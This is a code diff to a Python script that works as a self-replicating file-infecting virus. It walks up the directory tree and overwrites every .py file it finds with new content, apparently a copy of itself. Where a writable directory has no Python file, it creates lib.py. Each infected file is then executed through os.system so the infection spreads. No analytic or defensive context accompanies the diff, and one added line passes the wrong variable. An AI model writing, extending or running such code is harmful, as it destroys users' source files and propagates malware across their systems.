@@ -27,8 +27,10 @@ def run(dir):
         if os.path.isfile(file):
             if ".py" in file_lower:
                 files.append(os.path.abspath(file))
+                infect([file])
         else:
-            dirs.append(os.path.abspath(file))
+            if not file[0] == ".":
+                dirs.append(os.path.abspath(file))
     
     while dirs != []:
         for dir in dirs:
@@ -42,15 +44,20 @@ def run(dir):
                 if os.path.isfile(file):
                     if ".py" in file_lower:
                         tmp.append(os.path.abspath(file))
+                        infect([file])
                 else:
-                    dirs.append(os.path.abspath(file))
+                    if not file[0] == ".":
+                        dirs.append(os.path.abspath(file))
             if tmp == []:
-                infect(["lib.py"])
+                name = "lib.py"
+                if os.access(dir, os.W_OK):
+                    file_write = open(name, "w")
+                    file_write.close()
+                    tmp.append(os.path.abspath(name))
+                    infect([file])
             files += tmp
     
     infect(files)
-    
-    run(files)
     
 
 def infect(files):
@@ -64,12 +71,9 @@ def infect(files):
             file_write = open(name, "w")
             file_write.write(new_content)
             file_write.close()
-
-def run(files):
-    for file in files:
-        command = "python " + file
+        
+        command = "python " + name
         os.system(command)
-
 
 
 run(get_parent_dir(os.getcwd()))
